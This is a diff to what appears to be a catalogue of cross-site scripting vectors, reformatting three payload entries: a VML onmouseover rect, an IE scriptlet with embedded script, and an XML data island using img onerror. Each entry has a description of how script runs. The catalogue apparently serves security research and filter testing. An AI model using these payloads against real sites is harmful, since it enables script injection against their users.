@@ -1041,7 +1041,7 @@ var items =
             'samedomain'    : '0',            
             'path'          : '',
             'name'          : 'test.vml',
-            'raw'           : '<xml><rect style="height:100%;width:100%" id="xss" onmouseover="%js_alert%" strokecolor="white" strokeweight="2000px" filled="false" /></xml>'
+            'raw'           : '<xml>\r\n\t<rect style="height:100%;width:100%" id="xss" onmouseover="%js_alert%" strokecolor="white" strokeweight="2000px" filled="false" />\r\n</xml>'
         },
         'description': {
             'en' : 'A VML frame object works by giving the VML frame a "src" attribute and have it point to another VML object. A VML frame object in quirks mode can enclose a VML rect object or regular HTML which is responding to mouseover events.',
@@ -1618,7 +1618,7 @@ var items =
             'samedomain'    : '1',            
             'path'          : '',
             'name'          : 'test.sct',
-            'raw'           : '<SCRIPTLET><IMPLEMENTS Type="Behavior"></IMPLEMENTS><SCRIPT Language="javascript">%js_alert%</SCRIPT></SCRIPTLET>'
+            'raw'           : '<SCRIPTLET>\r\n\t<IMPLEMENTS Type="Behavior"></IMPLEMENTS>\r\n\t<SCRIPT Language="javascript">%js_alert%</SCRIPT>\r\n</SCRIPTLET>'
         },        
         'description': {
             'en' : 'Internet Explorer supports Scriptlets as an alternative binding method for Data Islands. By using the shown examples JavaScript will execute without user interaction.',
@@ -1654,7 +1654,7 @@ var items =
             'samedomain'    : '1',            
             'path'          : '',
             'name'          : 'test.htc',
-            'raw'           : '<?xml version="1.0"?><x>\r\n<payload><![CDATA[<img src=x onerror=%js_alert%>]]></payload>\r\n</x>'
+            'raw'           : '<?xml version="1.0"?>\r\n<x>\r\n<payload><![CDATA[<img src=x onerror=%js_alert%>]]></payload>\r\n</x>'
         },        
         'description': {
             'en' : 'Internet Explorer supports Data Islands as an XMLish binding method. By using the shown examples JavaScript will execute without user interaction.',
